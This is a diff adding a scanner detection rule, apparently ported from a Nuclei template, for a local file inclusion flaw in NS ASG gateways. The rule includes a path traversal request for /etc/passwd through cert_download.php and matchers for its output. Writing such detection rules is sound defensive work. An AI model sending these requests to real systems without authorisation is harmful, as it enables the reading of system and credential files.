@@ -1,0 +1,40 @@
+schema_version: 1
+id: "cortex.community:nsasg-arbitrary-file-read"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "NS ASG - Local File Inclusion"
+  description: "NS ASG is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://zhuanlan.zhihu.com/p/368054963"
+    - "http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E5%BA%B7%20NS-ASG%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  cwes: [22]
+  tags: ["nsasg", "lfi", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd" }
+  - id: "probe1"
+    request: { method: "GET", path: "/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    any:
+      - any:
+          - regex: { left: { ref: "steps.probe0.body" }, right: { value: "root:.*:0:0:" } }
+          - all:
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "$certfile" } }
+              - contains: { left: { ref: "steps.probe0.body" }, right: { value: "application/pdf" } }
+      - any:
+          - regex: { left: { ref: "steps.probe1.body" }, right: { value: "root:.*:0:0:" } }
+          - all:
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "$certfile" } }
+              - contains: { left: { ref: "steps.probe1.body" }, right: { value: "application/pdf" } }
